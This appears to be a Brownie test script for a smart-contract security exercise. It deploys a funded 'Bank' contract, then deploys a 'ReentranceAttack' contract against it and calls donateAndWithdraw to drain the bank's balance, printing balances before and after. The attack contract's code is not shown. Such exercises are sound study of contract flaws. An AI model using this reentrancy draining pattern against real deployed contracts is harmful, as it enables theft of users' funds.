import brownie


def test_bank(accounts,  Bank, ReentranceAttack):
    # network.gas_limit(10000000)
    accounts[0].balance = 90833538299999900
    bank_balance = 10000000000000000
    print(accounts[0].balance)
    print(bank_balance)
    bank = Bank.deploy({"from": accounts[1]})
    accounts[9].transfer(bank, bank_balance)
    print(bank.balance())

    labingi = ReentranceAttack.deploy(bank.address, {"from": accounts[0]})
    labingi.set_target_value(bank_balance, {"from": accounts[0]})
    labingi.donateAndWithdraw({"from": accounts[0], "value": bank_balance})

    print(labingi.balance(), bank.balance())
